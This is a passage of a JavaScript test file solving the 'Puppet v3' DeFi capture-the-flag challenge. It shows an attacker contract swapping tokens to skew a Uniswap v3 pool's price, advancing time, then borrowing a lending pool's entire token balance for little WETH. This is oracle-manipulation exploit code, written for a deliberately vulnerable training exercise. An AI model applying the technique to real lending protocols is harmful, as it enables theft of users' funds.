...
describe("[Challenge] Puppet v3", function () {
  ...
  it("Execution", async function () {
    ...
    const beforeSlot0 = await uniswapPool.slot0();

    console.log("Current sqrtPriceX96:", beforeSlot0.sqrtPriceX96);
    console.log("Current tick:", beforeSlot0.tick);
    console.log("Current liquidity:", await uniswapPool.liquidity());

    console.log(
      "Before Player WETH Balance: ",
    ...
    await attacker.swap(PLAYER_INITIAL_TOKEN_BALANCE - 1n * 10n ** 18n, {
      gasLimit: 1e6,
    });

    console.log(
      "Attacker Token To WETH Swap Success, Player WETH Balance : ",
      await weth.balanceOf(player.address)
    );

    console.log(
      "Current time increase before block number",
    ...
    console.log(
      "Current time increase after block number",
      await ethers.provider.getBlockNumber()
    );

    const afterSlot0 = await uniswapPool.slot0();

    console.log("Current sqrtPriceX96: ", afterSlot0.sqrtPriceX96);
    console.log("Current tick: ", afterSlot0.tick);
    console.log("Current Liquidity: ", await uniswapPool.liquidity());

    console.log(
      "Brrowing Token from Lending Pool: ",
      await lendingPool.calculateDepositOfWETHRequired(
        LENDING_POOL_INITIAL_TOKEN_BALANCE
      )
    );
    ...
    await weth
      .connect(player)
      .approve(lendingPool.address, LENDING_POOL_INITIAL_TOKEN_BALANCE);

    await lendingPool
      .connect(player)
      .borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);

    console.log("Player Borrow Success");

    console.log(
      "After Player WETH Balance: ",
